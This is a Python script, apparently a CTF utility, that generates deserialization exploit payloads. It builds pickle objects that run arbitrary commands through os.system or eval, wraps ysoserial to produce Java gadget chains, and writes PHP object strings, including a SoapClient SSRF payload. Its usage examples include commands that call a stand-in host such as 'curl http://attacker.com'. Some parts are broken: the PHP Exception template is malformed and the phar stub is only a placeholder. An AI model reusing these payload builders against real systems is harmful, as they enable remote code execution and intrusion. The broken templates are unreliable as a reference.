#!/usr/bin/env python3
"""
Deserialization Payload Generator
Generate payloads for Java, Python, and PHP deserialization exploits.

Usage:
    # Python pickle payload
    python3 gen_payload.py --lang python --cmd "__import__('os').popen('id').read()"

    # Java payload (requires ysoserial)
    python3 gen_payload.py --lang java --gadget CommonsCollections1 --cmd "curl http://attacker.com"

    # PHP payload
    python3 gen_payload.py --lang php --class "Exception" --msg "test"

    # Output to file
    python3 gen_payload.py --lang python --cmd "id" --output payload.bin
"""

import argparse
import base64
import os
import pickle
import subprocess
import sys
import tempfile
from typing import Optional


class PayloadGenerator:
    """Generate deserialization payloads for various languages."""

    def __init__(self, output_format: str = 'base64'):
        self.output_format = output_format

    def generate_python(self, cmd: str, use_eval: bool = False) -> bytes:
        """Generate Python pickle payload."""
        if use_eval:
            # Use eval-based payload
            class PickleRCE:
                def __reduce__(self):
                    return (eval, (cmd,))
        else:
            # Use os.system by default
            class PickleRCE:
                def __reduce__(self):
                    import os
                    return (os.system, (cmd,))

        payload = pickle.dumps(PickleRCE())
        return payload

    def generate_python_b64(self, cmd: str) -> str:
        """Generate base64 encoded Python pickle."""
        payload = self.generate_python(cmd)
        return base64.b64encode(payload).decode()

    def generate_java(self, gadget: str, cmd: str, ysoserial_path: str = 'ysoserial.jar') -> Optional[bytes]:
        """Generate Java payload using ysoserial."""
        if not os.path.exists(ysoserial_path):
            print(f"Error: {ysoserial_path} not found.", file=sys.stderr)
            print("Download from: https://github.com/frohoff/ysoserial", file=sys.stderr)
            return None

        try:
            result = subprocess.run(
                ['java', '-jar', ysoserial_path, gadget, cmd],
                capture_output=True,
                check=True
            )
            return result.stdout
        except subprocess.CalledProcessError as e:
            print(f"Error generating payload: {e.stderr.decode()}", file=sys.stderr)
            return None
        except FileNotFoundError:
            print("Error: Java not found in PATH", file=sys.stderr)
            return None

    def generate_php(self, php_class: str, **kwargs) -> str:
        """Generate PHP serialization payload."""
        # Common PHP gadget templates
        templates = {
            'Exception': self._php_exception,
            'SoapClient': self._php_soapclient,
            'stdClass': self._php_stdclass,
        }

        if php_class in templates:
            return templates[php_class](**kwargs)
        else:
            # Generic object template
            return self._php_generic(php_class, **kwargs)

    def _php_exception(self, msg: str = 'test', code: int = 0) -> str:
        """Generate PHP Exception payload."""
        # Exception can leak file paths in trace
        serialized = f'O:9:"Exception":7:{{s:7:"message";s:{len(msg)}:"{msg}";s:17:"Exceptionstring";s:0:"";s:7:"code";i:{code};s:9:"line";i:0;}}'
        return serialized

    def _php_soapclient(self, url: str = 'http://127.0.0.1:8080') -> str:
        """Generate PHP SoapClient SSRF payload."""
        # SoapClient can be used for SSRF
        options = f's:8:"location";s:{len(url)}:"{url}";s:3:"uri";s:{len(url)}:"{url}";'
        serialized = f'O:10:"SoapClient":2:{{{options}}}'
        return serialized

    def _php_stdclass(self, **props) -> str:
        """Generate PHP stdClass payload."""
        if not props:
            props = {'name': 'test', 'value': '123'}

        props_str = ''
        count = 0
        for k, v in props.items():
            props_str += f's:{len(k)}:"{k}";s:{len(v)}:"{v}";'
            count += 1

        return f'O:8:"stdClass":{count}:{{{props_str}}}'

    def _php_generic(self, class_name: str, **props) -> str:
        """Generate generic PHP object payload."""
        if not props:
            props = {'test': 'value'}

        props_str = ''
        count = 0
        for k, v in props.items():
            props_str += f's:{len(k)}:"{k}";s:{len(v)}:"{v}";'
            count += 1

        return f'O:{len(class_name)}:"{class_name}":{count}:{{{props_str}}}'

    def generate_phar_stub(self, payload: str) -> bytes:
        """Generate minimal phar stub for PHP phar deserialization."""
        # Create a minimal phar archive with the payload
        phar_stub = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        return phar_stub

    def format_output(self, payload: bytes) -> str:
        """Format payload according to output format."""
        if self.output_format == 'base64':
            return base64.b64encode(payload).decode()
        elif self.output_format == 'hex':
            return payload.hex()
        elif self.output_format == 'raw':
            return payload.decode('latin-1')  # For display only
        elif self.output_format == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        else:
            return base64.b64encode(payload).decode()


def list_java_gadgets(ysoserial_path: str = 'ysoserial.jar') -> None:
    """List available ysoserial gadgets."""
    if not os.path.exists(ysoserial_path):
        print(f"Error: {ysoserial_path} not found.", file=sys.stderr)
        return

    try:
        result = subprocess.run(
            ['java', '-jar', ysoserial_path],
            capture_output=True,
            text=True
        )
        # ysoserial outputs help to stderr
        output = result.stderr if result.stderr else result.stdout
        print(output)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(
        description='Generate deserialization payloads for CTF',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Python pickle
    python3 gen_payload.py --lang python --cmd "__import__('os').popen('id').read()"

    # Java ysoserial (requires ysoserial.jar)
    python3 gen_payload.py --lang java --gadget CommonsCollections1 --cmd "curl http://attacker.com"

    # PHP object
    python3 gen_payload.py --lang php --class "Exception" --msg "test"

    # PHP SoapClient SSRF
    python3 gen_payload.py --lang php --class "SoapClient" --url "http://127.0.0.1:8080"

    # List Java gadgets
    python3 gen_payload.py --list-java-gadgets
        """
    )

    parser.add_argument('--lang', '-l', choices=['python', 'java', 'php'],
                       help='Target language')
    parser.add_argument('--cmd', '-c', help='Command to execute (Python/Java)')
    parser.add_argument('--gadget', '-g', help='Java gadget chain (e.g., CommonsCollections1)')
    parser.add_argument('--class', dest='php_class', help='PHP class name')
    parser.add_argument('--msg', '-m', help='Exception message (PHP)')
    parser.add_argument('--url', '-u', help='URL for SoapClient/SSRF (PHP)')
    parser.add_argument('--output', '-o', help='Output file')
    parser.add_argument('--format', choices=['base64', 'hex', 'raw', 'url'],
                       default='base64', help='Output format')
    parser.add_argument('--ysoserial-path', default='ysoserial.jar',
                       help='Path to ysoserial.jar')
    parser.add_argument('--list-java-gadgets', action='store_true',
                       help='List available Java gadgets')

    args = parser.parse_args()

    # List gadgets and exit
    if args.list_java_gadgets:
        list_java_gadgets(args.ysoserial_path)
        return 0

    if not args.lang:
        parser.print_help()
        return 1

    gen = PayloadGenerator(output_format=args.format)

    # Generate payload based on language
    if args.lang == 'python':
        if not args.cmd:
            print("Error: --cmd required for Python payload", file=sys.stderr)
            return 1

        payload = gen.generate_python(args.cmd)
        output = gen.format_output(payload)

    elif args.lang == 'java':
        if not args.gadget or not args.cmd:
            print("Error: --gadget and --cmd required for Java payload", file=sys.stderr)
            return 1

        payload = gen.generate_java(args.gadget, args.cmd, args.ysoserial_path)
        if payload is None:
            return 1
        output = gen.format_output(payload)

    elif args.lang == 'php':
        if not args.php_class:
            print("Error: --class required for PHP payload", file=sys.stderr)
            return 1

        # Build kwargs based on class type
        kwargs = {}
        if args.msg:
            kwargs['msg'] = args.msg
        if args.url:
            kwargs['url'] = args.url

        output = gen.generate_php(args.php_class, **kwargs)

    else:
        parser.print_help()
        return 1

    # Output result
    if args.output:
        mode = 'wb' if args.lang in ['python', 'java'] else 'w'
        with open(args.output, mode) as f:
            if args.lang in ['python', 'java']:
                if isinstance(output, str):
                    f.write(base64.b64decode(output))
                else:
                    f.write(output if isinstance(output, bytes) else output.encode())
            else:
                f.write(output)
        print(f"Payload saved to: {args.output}")
    else:
        print(output)

    return 0


if __name__ == '__main__':
    sys.exit(main())
